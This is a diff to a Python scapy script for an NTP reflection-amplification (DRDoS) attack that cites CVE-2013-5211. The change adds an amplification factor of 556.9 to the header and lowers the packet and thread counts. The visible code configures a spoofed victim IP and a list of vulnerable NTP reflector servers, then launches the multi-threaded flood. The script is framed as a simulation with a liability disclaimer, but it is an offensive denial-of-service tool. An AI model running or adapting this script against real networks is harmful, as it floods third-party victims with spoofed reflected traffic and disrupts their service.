@@ -6,6 +6,9 @@
 |https://www.cisa.gov/news-events/alerts/2014/01/13/ntp-amplification-attacks-using-cve-2013-5211 |
 |I am NOT responsible for any damages caused or any crimes committed by using this tool.          |
 ###################################################################################################
+
+Bandwidth Amplification Factor - 556.9
+
 '''
 from scapy.all import IP, UDP, Raw, send
 from concurrent.futures import ThreadPoolExecutor
@@ -51,8 +54,8 @@ if __name__ == "__main__":
     # Substitua pelos valores que deseja usar para simulação
     TARGET_IP = "192.168.1.1"   # IP da "vítima" (falsificado)
     NTP_SERVERS = ["192.168.1.2","192.168.1.3","192.168.1.4"]  # Lista de servidores NTP vulneráveis
-    NUM_PACKETS_PER_SERVER = 100  # Número de pacotes a enviar por servidor
-    NUM_THREADS = 50  # Número de threads para paralelismo
+    NUM_PACKETS_PER_SERVER = 1  # Número de pacotes a enviar por servidor
+    NUM_THREADS = 10  # Número de threads para paralelismo
 
     print("Simulando ataque DRDoS NTP...")
     simulate_ntp_dr_dos_multiple(TARGET_IP, NTP_SERVERS, NUM_PACKETS_PER_SERVER, NUM_THREADS)
